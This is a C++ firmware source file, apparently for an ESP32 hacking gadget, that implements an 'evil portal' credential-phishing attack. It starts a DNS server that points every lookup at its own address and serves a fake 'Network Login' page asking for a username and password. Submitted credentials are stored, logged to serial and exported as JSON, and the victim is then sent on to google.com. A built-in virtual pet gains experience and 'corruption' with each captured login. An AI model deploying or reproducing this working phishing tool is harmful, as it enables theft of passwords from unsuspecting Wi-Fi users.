#include "evil_portal.h"
#include "zahl_pet.h"
#include "soul_ledger.h"
#include <DNSServer.h>
#include <WiFi.h>

static DNSServer dnsServer;
static bool      portalActive = false;
static const byte DNS_PORT    = 53;

Credential portalCreds[MAX_CREDS];
int        portalCredCount = 0;

static const char PORTAL_HTML[] PROGMEM = R"html(
<!DOCTYPE html><html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Network Login</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0a0a;color:#ddd;font-family:Arial,sans-serif;
     display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#141422;border:1px solid #333;padding:32px 28px;
      border-radius:4px;width:320px;text-align:center}
.logo{font-size:11px;color:#666;letter-spacing:3px;margin-bottom:4px}
h1{color:#fff;font-size:20px;margin-bottom:22px;font-weight:400}
input{display:block;width:100%;padding:11px 12px;margin-bottom:10px;
      background:#0d0d1e;border:1px solid #3a3a5c;color:#eee;
      border-radius:2px;font-size:14px;outline:none}
input:focus{border-color:#5555aa}
button{width:100%;padding:12px;background:#3a3aaa;color:#fff;
       border:none;cursor:pointer;font-size:15px;border-radius:2px;
       letter-spacing:1px}
button:hover{background:#4a4acc}
.sub{margin-top:14px;font-size:11px;color:#444}
</style>
</head>
<body>
<div class="card">
<div class="logo">NETWORK ACCESS</div>
<h1>Sign In to Continue</h1>
<form method="POST" action="/portal/submit">
<input type="text"     name="user" placeholder="Username or Email" required autocomplete="username">
<input type="password" name="pass" placeholder="Password"          required autocomplete="current-password">
<button type="submit">CONNECT</button>
</form>
<p class="sub">You will be redirected after authentication.</p>
</div>
</body>
</html>
)html";

static const char PORTAL_OK[] PROGMEM = R"html(
<!DOCTYPE html><html>
<head>
<meta charset="UTF-8">
<meta http-equiv="refresh" content="2;url=http://google.com">
<style>body{background:#0a0a0a;color:#aaa;font-family:Arial;
text-align:center;padding-top:40vh;font-size:16px}</style>
</head>
<body><p>Authenticating...</p></body>
</html>
)html";

void initEvilPortal() {
    portalActive    = false;
    portalCredCount = 0;
}

void setPortalEnabled(bool en) {
    if (en == portalActive) return;
    if (en) {
        dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
        portalActive = true;
        Serial.println("Evil portal: ON");
    } else {
        dnsServer.stop();
        portalActive = false;
        Serial.println("Evil portal: OFF");
    }
}

void runPortalDns() {
    if (portalActive) dnsServer.processNextRequest();
}

bool isPortalActive() { return portalActive; }

void handlePortalSubmit(const String& user, const String& pass) {
    if (portalCredCount < MAX_CREDS) {
        strlcpy(portalCreds[portalCredCount].user, user.c_str(), 63);
        strlcpy(portalCreds[portalCredCount].pass, pass.c_str(), 63);
        portalCreds[portalCredCount].capturedAt = millis();
        portalCredCount++;
    }
    Zahl.feed(20);
    Zahl.addExperience(15);
    if (Zahl.corruption < 100) Zahl.corruption = min(100, (int)Zahl.corruption + 10);
    if (Zahl.entropy   < 100) Zahl.entropy    = min(100, (int)Zahl.entropy   + 5);

    char sid[32];
    snprintf(sid, sizeof(sid), "PORTAL_%d", portalCredCount);
    if (addSoul(sid, user.c_str(), SOUL_PORTAL, -55)) {
        Zahl.consumeSoul(SOUL_PORTAL);
    }
    Serial.printf("Portal cred: %s\n", user.c_str());
}

String getCredsJson() {
    String out = "{\"count\":" + String(portalCredCount) + ",\"creds\":[";
    for (int i = 0; i < portalCredCount; i++) {
        if (i > 0) out += ",";
        out += "{\"user\":\""; out += portalCreds[i].user;
        out += "\",\"pass\":\""; out += portalCreds[i].pass;
        out += "\"}";
    }
    out += "]}";
    return out;
}

const char* getPortalHtml()    { return PORTAL_HTML; }
const char* getPortalSuccess() { return PORTAL_OK; }
